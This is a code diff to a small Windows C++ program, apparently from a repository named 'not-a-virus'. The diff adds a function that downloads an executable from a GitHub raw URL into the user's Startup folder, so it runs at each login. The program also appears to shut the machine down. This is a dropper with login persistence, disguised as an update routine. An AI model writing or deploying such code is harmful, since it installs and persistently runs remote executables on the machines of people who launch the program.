@@ -2,19 +2,14 @@
 #include <iostream>
 #include <windows.h>
 #include <winbase.h>
-
-/**
-TODO:
-- Update automatically
-
-*/
+#include <urlmon.h>
 
 unsigned amount;
 bool downShut;
 bool quitNormally;
 
-void CheckForUpdate() {
-    
+void DownloadFile(std::string path) {
+    URLDownloadToFileA(NULL, (LPCSTR)"https://raw.githubusercontent.com/ethanaobrien/not-a-virus/main/application.exe", path.c_str(), 0, NULL);
 }
 
 void ShutDown() {
@@ -45,14 +40,16 @@ int yes() {
 
 int main(int argc, char** argv)
 {
-    CheckForUpdate();
     char username[100];
     DWORD username_len = 100;
     GetUserNameA(username, &username_len);
     std::string UserName = username;
     std::string pathOut = "C:\\\\Users\\" + UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\yes.exe";
     remove(pathOut.c_str());
+    DownloadFile(pathOut);
+    /*
     CopyFileA((LPCSTR)argv[0], pathOut.c_str(), false);
+    */
     
     downShut = false;
     amount = 0;
